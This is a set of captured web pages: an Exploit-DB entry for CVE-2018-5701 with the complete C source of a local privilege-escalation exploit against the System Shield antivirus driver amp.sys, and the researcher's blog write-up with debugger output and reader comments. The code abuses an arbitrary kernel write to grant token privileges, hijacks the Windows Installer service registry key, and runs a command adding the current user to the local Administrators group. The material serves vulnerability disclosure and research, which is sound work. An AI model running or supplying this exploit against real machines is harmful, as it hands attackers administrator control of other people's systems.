=== Content from www.exploit-db.com_c60c8c68_20250125_122001.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# System Shield 5.0.0.136 - Privilege Escalation

#### EDB-ID:

###### 43929

#### CVE:

###### [2018-5701](https://nvd.nist.gov/vuln/detail/CVE-2018-5701)

---

**EDB Verified:**

#### Author:

###### [Parvez Anwar](/?author=6706)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2018-01-30

---

**Vulnerable App:**

```
/*

Exploit Title    - System Shield AntiVirus & AntiSpyware Arbitrary Write Privilege Escalation
Date             - 29th January 2018
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.iolo.com/
Tested Version   - 5.0.0.136
Driver Version   - 5.4.11.1 - amp.sys
Tested on OS     - 64bit Windows 7 and Windows 10 (1709)
CVE ID           - CVE-2018-5701
Vendor fix url   -
Fixed Version    - 0day
Fixed driver ver - 0day

Check blogpost for details:

https://www.greyhathacker.net/?p=1006

*/

#include <stdio.h>
#include <windows.h>
#include <aclapi.h>

#pragma comment(lib,"advapi32.lib")

#define MSIEXECKEY "MACHINE\\SYSTEM\\CurrentControlSet\\services\\msiserver"

#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)

typedef unsigned __int64 QWORD;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
     ULONG       ProcessId;
     UCHAR       ObjectTypeNumber;
     UCHAR       Flags;
     USHORT      Handle;
     QWORD       Object;
     ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
     ULONG NumberOfHandles;
     SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     ULONG SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);

QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID)
{
    _NtQuerySystemInformation   NtQuerySystemInformation;
    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo;
    ULONG                       i;
    PSYSTEM_HANDLE              pHandle;
    QWORD                       TokenAddress = 0;
    DWORD                       nSize = 4096;
    DWORD                       nReturn;
    BOOL                        tProcess;
    HANDLE                      hToken;

    if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
    {
        printf("\n[-] OpenProcessToken() failed (%d)\n", GetLastError());
        return -1;
    }

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;
    }

    do
    {
        nSize += 4096;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION) HeapAlloc(GetProcessHeap(), 0, nSize);
    } while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH);

    printf("\n[i] Current process id %d and token handle value %u", MyProcessID, hToken);

    for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++)
    {

        if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == hToken)
        {
            TokenAddress = pSysHandleInfo->Handles[i].Object;
        }
    }

    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
    return TokenAddress;
}

int TakeOwnership()
{
     HANDLE           token;
     PTOKEN_USER      user = NULL;
     PACL             pACL = NULL;
     EXPLICIT_ACCESS  ea;
     DWORD            dwLengthNeeded;

     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token))
     {
         printf("\n[-] OpenProcessToken failed %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] OpenProcessToken successful");

     if (!GetTokenInformation(token, TokenUser, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
     {
         printf("\n[-] Failed to initialize GetTokenInformation %d\n\n", GetLastError());
         ExitProcess(1);
     }

     user = (PTOKEN_USER)LocalAlloc(0, dwLengthNeeded);

     if (!GetTokenInformation(token, TokenUser, user, dwLengthNeeded, &dwLengthNeeded))
     {
         printf("\n[-] GetTokenInformation failed %d\n\n", GetLastError());
         ExitProcess(1);
     }

     ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));

// build DACL

     ea.grfAccessPermissions = KEY_ALL_ACCESS;
     ea.grfAccessMode = GRANT_ACCESS;
     ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
     ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
     ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
     ea.Trustee.ptstrName = (LPTSTR)user->User.Sid;

     if (SetEntriesInAcl(1, &ea, NULL, &pACL) != ERROR_SUCCESS)
     {
         printf("\n[-] SetEntriesInAcl failure\n\n");
         ExitProcess(1);
     }
     printf("\n[+] SetEntriesInAcl successful");

// Take ownership

     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, user->User.Sid, NULL, NULL, NULL) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to obtain the object's ownership %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Ownership '%s' successful", MSIEXECKEY);

// Modify DACL

     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to modify the object's DACL %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Object's DACL successfully modified");

     LocalFree(pACL);
     CloseHandle(token);

     return 0;
}

int RestorePermissions()
{
     PACL             pOldDACL = NULL;
     PSID             pSIDAdmin = NULL;
     SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;

     printf("\n[*] Restoring all permissions and value");

// Restore registry value

     WriteToRegistry("%systemroot%\\system32\\msiexec.exe /V");

// Sid for the BUILTIN\Administrators group

     if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,  &pSIDAdmin))
     {
         printf("\nAllocateAndInitializeSid failed %d\n\n", GetLastError());
         ExitProcess(1);
     }

// Restore key ownership

     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to restore the object's ownership %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Object's ownership successfully restored");

// Take copy of parent key

     if (GetNamedSecurityInfo("MACHINE\\SYSTEM\\CurrentControlSet\\Services", SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, NULL) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to copy parent key object's DACL %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Parent key object's DACL successfully saved");

// Restore key permissions

     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | UNPROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pOldDACL, NULL) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to restore the object's DACL %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Object's DACL successfully restored");

     FreeSid(pSIDAdmin);

     return 0;
}

int WriteToRegistry(char command[])
{
     HKEY hkeyhandle;

     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\services\\msiserver", 0, KEY_WRITE, &hkeyhandle) != ERROR_SUCCESS)
     {
         printf("\n[-] Registry key failed to open %d\n\n", GetLastError());
         ExitProcess(1);
     }

     if (RegSetValueEx(hkeyhandle, "ImagePath", 0, REG_EXPAND_SZ, (LPBYTE) command, strlen(command)) != ERROR_SUCCESS)
     {
         printf("\n[-] Registry value failed to write %d\n\n", GetLastError());
         ExitProcess(1);
     }

     printf("\n[+] Registry key opened and value modified");

     RegCloseKey(hkeyhandle);

     return 0;
}

int TriggerCommand()
{
     STARTUPINFO           si;
     PROCESS_INFORMATION   pi;

     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);

     if (!CreateProcess(NULL, "c:\\windows\\system32\\msiexec.exe /i poc.msi /quiet", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
         printf("\n[-] CreateProcess failed %d", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] c:\\windows\\system32\\msiexec.exe launched");
     printf("\n[i] Account should now be in the local administrators group");

     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);

     return 0;
}

int main(int argc, char *argv[])
{
    QWORD      TokenAddressTarget;
    QWORD      SepPrivilegesOffset = 0x40;
    QWORD      TokenAddress;
    HANDLE     hDevice;
    char       devhandle[MAX_PATH];
    DWORD      dwRetBytes = 0;
    QWORD      inbuffer1[3] = {0};
    QWORD      inbuffer2[3] = {0};
    QWORD      ptrbuffer[1] = {0};           // QWORD4 - Has to be 0 for arbitrary write value to be 0xfffffffe
    DWORD      currentusersize;
    char       currentuser[100];
    char       netcommand[MAX_PATH];

    printf("-------------------------------------------------------------------------------\n");
    printf("  System Shield AntiVirus & AntiSpyware (amp.sys) Arbitrary Write EoP Exploit  \n");
    printf("                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \n");
    printf("-------------------------------------------------------------------------------\n");

    TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
    printf("\n[i] Address of current process token 0x%p", TokenAddress);

    TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
    printf("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten", TokenAddressTarget);

    inbuffer1[0] = 0x8;                      // QWORD1 - Cannot be more than 8. Also different values (<9) calculates to different sub calls
    inbuffer1[1] = ptrbuffer;                // QWORD2 - Address used for read and write
    inbuffer1[2] = TokenAddressTarget+1;     // QWORD3 - Arbitrary write address !!!

    inbuffer2[0] = 0x8;
    inbuffer2[1] = ptrbuffer;
    inbuffer2[2] = TokenAddressTarget+9;

    sprintf(devhandle, "\\\\.\\%s", "amp");

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);

    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("\n[-] Open %s device failed\n\n", devhandle);
        return -1;
    }
    else
    {
        printf("\n[+] Open %s device successful", devhandle);
    }

    printf("\n[~] Press any key to continue . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x00226003, inbuffer1, sizeof(inbuffer1), NULL, 0, &dwRetBytes, NULL);
    DeviceIoControl(hDevice, 0x00226003, inbuffer2, sizeof(inbuffer2), NULL, 0, &dwRetBytes, NULL);

    printf("[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\n");
    CloseHandle(hDevice);

    currentusersize = sizeof(currentuser);

    if (!GetUserName(currentuser, &currentusersize))
    {
        printf("\n[-] Failed to obtain current username: %d\n\n", GetLastError());
        return -1;
    }

    printf("[*] Adding current user '%s' account to the local administrators group", currentuser);

    sprintf(netcommand, "net localgroup Administrators %s /add", currentuser);

    TakeOwnership();
    WriteToRegistry(netcommand);
    TriggerCommand();
    Sleep(1000);
    RestorePermissions();
    printf("\n\n");

    return 0;
}

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_4fc46d88_20250125_122000.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.greyhathacker.net_1eceb66d_20250126_082619.html ===


[GreyHatHacker.NET](https://www.greyhathacker.net/ "GreyHatHacker.NET")

Malware, Vulnerabilities, Exploits and more . . .

#### Menu

* [About](https://www.greyhathacker.net/?page_id=13)

Search for:

# Exploiting System Shield AntiVirus Arbitrary Write Vulnerability using SeTakeOwnershipPrivilege

A kernel vulnerability exists in an antivirus product called “System Shield AntiVirus and AntiSpyware” by Iolo Technologies. This is an arbitrary memory overwrite vulnerability due to the inputted buffer not being validated and has been assigned a CVE ID of CVE-2018-5701. The product version of “System Shield AntiVirus and AntiSpyware” tested on is 5.0.0.136 and the vulnerable version of the driver “amp.sys” is 5.4.11.1.

Due to no response from the vendor for the last few weeks I’m going public with this one. Another one of their products “System Mechanic Pro” on version 15.5.0.61 is also affected from this vulnerability as it gets shipped with the same version of the driver as is bundled with “System Shield AntiVirus and AntiSpyware”. There is however an update downloader link on the site for “System Mechanic Pro” bringing it to version 17.5.0.116 where the vulnerable driver has been removed.

To get to our arbitrary write a number of conditions had to be satisfied in a number of subroutines, the main disassembly screen shots shown below.

![](/images/iolo-00226003-1.png)

![](/images/iolo-00226003-2.png)

To exploit I’m overwriting the \_SEP\_TOKEN\_PRIVILEGES structure with the fixed value of 0xFFFFFFFE. You can play with the offsets to get different number of privileges but with the offsets I chose I ended up looking like this below

```
kd> dt nt!_SEP_TOKEN_PRIVILEGES fffff8a002cc4a30+40
   +0x000 Present          : 0xff`fffffe00
   +0x008 Enabled          : 0xff`fffffe00
   +0x010 EnabledByDefault : 0x800000
```

Looking at the number of privileges obtained we have a few to choose from for our exploit.

```
kd> !token fffff8a002cc4a30
_TOKEN fffff8a002cc4a30
TS Session ID: 0x1
User: S-1-5-21-2231847605-3015871416-1385684711-1001
Groups:
 00 S-1-5-21-2231847605-3015871416-1385684711-513
    Attributes - Mandatory Default Enabled
 01 S-1-1-0
    Attributes - Mandatory Default Enabled
 02 S-1-5-114
    Attributes - DenyOnly
 03 S-1-5-32-545
    Attributes - Mandatory Default Enabled
 04 S-1-5-32-544
    Attributes - DenyOnly
 05 S-1-5-4
    Attributes - Mandatory Default Enabled
 06 S-1-2-1
    Attributes - Mandatory Default Enabled
 07 S-1-5-11
    Attributes - Mandatory Default Enabled
 08 S-1-5-15
    Attributes - Mandatory Default Enabled
 09 S-1-5-113
    Attributes - Mandatory Default Enabled
 10 S-1-5-5-0-1059199
    Attributes - Mandatory Default Enabled LogonId
 11 S-1-2-0
    Attributes - Mandatory Default Enabled
 12 S-1-5-64-10
    Attributes - Mandatory Default Enabled
 13 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled
Primary Group: S-1-5-21-2231847605-3015871416-1385684711-513
Privs:
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled
 10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled
 12 0x00000000c SeSystemtimePrivilege             Attributes - Enabled
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled
 17 0x000000011 SeBackupPrivilege                 Attributes - Enabled
 18 0x000000012 SeRestorePrivilege                Attributes - Enabled
 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
 24 0x000000018 SeRemoteShutdownPrivilege         Attributes - Enabled
 25 0x000000019 SeUndockPrivilege                 Attributes - Enabled
 26 0x00000001a SeSyncAgentPrivilege              Attributes - Enabled
 27 0x00000001b SeEnableDelegationPrivilege       Attributes - Enabled
 28 0x00000001c SeManageVolumePrivilege           Attributes - Enabled
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - Enabled
 32 0x000000020 SeRelabelPrivilege                Attributes - Enabled
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled
 36 0x000000024 Unknown Privilege                 Attributes - Enabled
 37 0x000000025 Unknown Privilege                 Attributes - Enabled
 38 0x000000026 Unknown Privilege                 Attributes - Enabled
 39 0x000000027 Unknown Privilege                 Attributes - Enabled
Authentication ID:         (0,1029c8)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: 13d229           ParentToken ID: 1029cb
Modified ID:               (0, 139e0a)
RestrictedSidCount: 0      RestrictedSids: 0000000000000000
OriginatingLogonSession: 3e7
```

For exploiting I decided to use the “SeTakeOwnershipPrivilege” privilege. The idea I had was to take ownership of a Windows Service key and have the ability to start it. The service I found was the “Windows Installer” service.

So the steps were to:

1. Take ownership of the key HKLM\SYSTEM\CurrentControlSet\services\msiserver
2. Change the “ImagePath” value to our command or executable we which want to run
3. Start the service by running “msiexec.exe /i poc.msi /quiet”
4. Restore all settings

Here poc.msi doesn’t really exist but by initiating an msi install will start the service and run our command. Trying to get an interactive shell is another matter as we have to deal with “Session 0 Isolation” which I haven’t really looked into so decided to use the net command to add the account to the local administrators group.

![](/images/cve-2018-5701.png)

The exploit can be downloaded from here [[zip](/docs/cve-2018-5701.zip)]

[@ParvezGHH](https://twitter.com/parvezghh)

Posted in [All](https://www.greyhathacker.net/?cat=18), [Bugs](https://www.greyhathacker.net/?cat=8), [Exploits](https://www.greyhathacker.net/?cat=7), [Vulnerabilities](https://www.greyhathacker.net/?cat=6) and tagged [Elevate](https://www.greyhathacker.net/?tag=elevate), [Kernel](https://www.greyhathacker.net/?tag=kernel) on [January 29, 2018](https://www.greyhathacker.net/?p=1006 "1:14 pm") by [Parvez](https://www.greyhathacker.net/?author=1 "View all posts by Parvez"). [11 Comments](https://www.greyhathacker.net/?p=1006#comments)

[← IKARUS anti.virus and its 9 exploitable kernel vulnerabilities](https://www.greyhathacker.net/?p=995) [Exploiting STOPzilla AntiMalware Arbitrary Write Vulnerability using SeCreateTokenPrivilege →](https://www.greyhathacker.net/?p=1025)

### 11 comments

1. ![](https://secure.gravatar.com/avatar/a09b017c9080011743d39df8365c7e6e?s=40&d=mm&r=g) **[Vonnie](https://www.securitypluspro.com)** says:
   [January 31, 2018 at 10:02 pm](https://www.greyhathacker.net/?p=1006#comment-13569)

   Nice write up – where can I get the vulnerable app? I checked IOLO’s website and the exploitdb but I can’t find 5.0.0.136
3. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
   [February 1, 2018 at 9:48 am](https://www.greyhathacker.net/?p=1006#comment-13570)

   For “System Shield AntiVirus and AntiSpyware” you’ll need to run the downloader which downloads the main installation package but then you’ll need to also request a license. Best just to download “System Mechanic Pro” and install as a trial, this downloads the entire package and no license is required for installation

   <http://download.iolo.net/sm/15/pro/en/iolo/trial/SystemMechanicPro_15.5.0.61.exe>
5. ![](https://secure.gravatar.com/avatar/29a97a38bea34f7d0a36d16efb58fe78?s=40&d=mm&r=g) **Alex** says:
   [February 10, 2018 at 5:18 pm](https://www.greyhathacker.net/?p=1006#comment-13573)

   Hello.

   Thanks for this demonstration!

   I have a question. With this exploit, can we access to the winlogon.exe and open a handle for read and write memory?

   Kind regards,
7. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
   [February 11, 2018 at 2:31 pm](https://www.greyhathacker.net/?p=1006#comment-13574)

   Yes you can as “SeDebugPrivilege” is also enabled
9. ![](https://secure.gravatar.com/avatar/29a97a38bea34f7d0a36d16efb58fe78?s=40&d=mm&r=g) **Alex** says:
   [February 11, 2018 at 11:57 pm](https://www.greyhathacker.net/?p=1006#comment-13575)

   Why doesn’t it work with csrss.exe?

   pHandle = OpenProcess(PROCESS\_VM\_READ, 0, 428); //my csrss PID

   printf(“> pHandle: %d || %s\n”, pHandle, pHandle);

   i got: 0 || (null)
11. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
    [February 12, 2018 at 12:13 pm](https://www.greyhathacker.net/?p=1006#comment-13576)

    It should work, most likely haven’t got the necessary privilege
13. ![](https://secure.gravatar.com/avatar/29a97a38bea34f7d0a36d16efb58fe78?s=40&d=mm&r=g) **Alex** says:
    [February 12, 2018 at 12:45 pm](https://www.greyhathacker.net/?p=1006#comment-13577)

